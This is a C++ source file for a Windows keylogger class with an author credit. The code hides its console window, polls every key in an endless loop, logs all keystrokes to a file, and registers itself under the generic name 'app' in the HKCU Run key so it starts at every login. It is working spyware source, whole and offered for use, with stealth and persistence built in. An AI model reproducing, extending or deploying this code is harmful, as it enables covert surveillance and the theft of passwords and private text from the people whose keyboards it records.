//   Author(s) : Narcis GRECU(narcisgrecu07@gmail.com

#include "KeyLogger.h"

#include <fstream>
#include <iostream>

#include <Windows.h>
#include <WinUser.h>

#define MSB -32767
#define BUFLEN 512

KeyLogger::KeyLogger(std::string Path)
{
	OutPath = Path;
}

bool KeyLogger::StartStealthMode()
{
	Console = FindWindowA("ConsoleWindowClass", NULL);

	if (Console == NULL)
	{
		WriteMessage("[!] Failed to find console!\n");
		return false;
	}

	ShowWindow(Console, SW_HIDE);

	return true;
}

void KeyLogger::StartLogging()
{
	unsigned char Key;
	std::string Character;
	bool CapsIsPressed = GetKeyState(VK_CAPITAL) & 0x0001;

	while (true)
	{
		for (Key = 8; Key <= 127; Key++)
		{
			if (GetAsyncKeyState(Key) == MSB)
			{
				if (Key == VK_CAPITAL)
					CapsIsPressed = !CapsIsPressed;

				Character = GetChar(Key, CapsIsPressed);

				WriteMessage(Character);
			}
		}
	}
}

std::string KeyLogger::GetChar(char Key, bool CapsIsPressed)
{
	std::string StringKey = "";
	std::string SpecialChars = "1234567890";

	if (Key >= 0x60 && Key <= 0x69) // it's a numpad key
	{
		StringKey = "[NUMPAD" + std::to_string(Key - 0x60) + "]";
		return StringKey;
	}

	if (Key >= 0x70 && Key <= 0x87) // it means it's a function key
	{
		StringKey = "[F" + std::to_string(Key - 0x70 + 1) + "]";
		return StringKey;
	}

	switch (Key) // check if it's virtual key
	{
	case VK_SPACE:
		StringKey = " ";
		return StringKey;

	case VK_ESCAPE:
		StringKey = "[ESC]";
		return StringKey;

	case VK_RETURN:
		StringKey = "[ENTER]\n";
		return StringKey;

	case VK_SHIFT:
		StringKey = "[SHIFT]";
		return StringKey;

	case VK_BACK:
		StringKey = "\b";
		return StringKey;

	case VK_CAPITAL:
		StringKey = "[CAPS LOCK]";
		return StringKey;

	case VK_TAB:
		StringKey = "[TAB]";
		return StringKey;

	case VK_UP:
		StringKey = "[UP ARROW]";
		return StringKey;

	case VK_DOWN:
		StringKey = "[DOWN ARROW]";
		return StringKey;

	case VK_LEFT:
		StringKey = "[LEFT ARROW]";
		return StringKey;

	case VK_RIGHT:
		StringKey = "[RIGHT ARROW]";
		return StringKey;

	case VK_CONTROL:
		StringKey = "[CONTROL]";
		return StringKey;

	case VK_MENU:
		StringKey = "[ALT]";
		return StringKey;

	case VK_OEM_1:
		StringKey = ";";

		if (IsPressed(VK_SHIFT))
			StringKey = ":";

		return StringKey;

	case VK_OEM_PLUS:
		StringKey = "=";

		if (IsPressed(VK_SHIFT))
			StringKey = "+";

		return StringKey;

	case VK_OEM_MINUS:
		StringKey = "-";

		if (IsPressed(VK_SHIFT))
			StringKey = "_";

		return StringKey;

	case VK_OEM_COMMA:
		StringKey = ",";

		if (IsPressed(VK_SHIFT))
			StringKey = "<";

		return StringKey;

	case VK_OEM_PERIOD:
		StringKey = ".";

		if (IsPressed(VK_SHIFT))
			StringKey = ">";

		return StringKey;

	default:
		StringKey = "";
		break;
	}

	if (Key >= 'A' && Key <= 'Z') // convert to lowercase if it's the case
	{
		if (CapsIsPressed && GetAsyncKeyState(VK_SHIFT) == MSB)
			Key = Key - 'A' + 'a';

		else if (!CapsIsPressed && !GetAsyncKeyState(VK_SHIFT))
			Key = Key - 'A' + 'a';
	
		StringKey.push_back(Key);
	}

	if (Key >= '0' && Key <= '9')
	{
		if (IsPressed(VK_SHIFT))
		{
			switch (Key)
			{
			case '0':
				Key = ')';
				break;

			case '1':
				Key = '!';
				break;

			case '2':
				Key = '@';
				break;

			case '3':
				Key = '#';
				break;

			case '4':
				Key = '$';
				break;

			case '5':
				Key = '%';
				break;

			case '6':
				Key = '^';
				break;

			case '7':
				Key = '&';
				break;

			case '8':
				Key = '*';
				break;

			case '9':
				Key = '(';
				break;

			default:
				break;
			}
		}

		StringKey.push_back(Key);
	}
	
	return StringKey;
}

void KeyLogger::WriteMessage(std::string Message)
{
	OutFile.open(OutPath, std::ios::app);
	OutFile << Message;

	OutFile.close();
}

bool KeyLogger::RegisterPersistence()
{
	char processPath[BUFLEN];

	if (!GetModuleFileNameA(nullptr, processPath, BUFLEN))
	{
		WriteMessage("[!] Failed to get path to the current process!\n");

		return false;
	}

	HKEY registryKey;

	long result = RegCreateKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		nullptr,
		0,
		KEY_WRITE | KEY_READ,
		nullptr,
		&registryKey,
		nullptr
	);

	if (result)
	{
		WriteMessage("[!] Failed to create/open key. \n");
		
		return false;
	}

	int bytesToSet = strlen(processPath);

	result = RegSetValueExA(registryKey, "app", 0, REG_SZ, reinterpret_cast<BYTE*>(processPath), bytesToSet);

	if (registryKey)
		RegCloseKey(registryKey);

	if (result != ERROR_SUCCESS)
		return false;

	return true;
}

bool KeyLogger::IsPressed(char Key)
{
	return (GetAsyncKeyState(Key) & MSB);
}